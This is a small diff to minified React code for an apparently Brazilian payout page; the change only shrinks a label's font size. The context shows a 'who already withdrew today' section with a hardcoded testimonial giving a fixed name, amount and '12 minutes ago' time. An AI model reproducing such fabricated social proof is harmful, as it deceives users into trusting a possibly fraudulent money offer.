@@ -366,7 +366,7 @@ const xe = () => {
             className: "mx-4 bg-white rounded-[16px] p-4 transition-all duration-500 ease-out space-y-3",
             style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "400ms" },
             children: [e.jsx("p", {
-                className: "text-muted-foreground text-[11px] uppercase tracking-wider font-bold text-center mb-1",
+                className: "text-muted-foreground text-[10px] uppercase tracking-wider font-bold text-center mb-1",
                 children: "Quem já sacou hoje"
             }), [{
                 img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min", text: "mano eu nem tava acreditando muito mas entrou certinho na minha conta, apareceu o pix na hora"
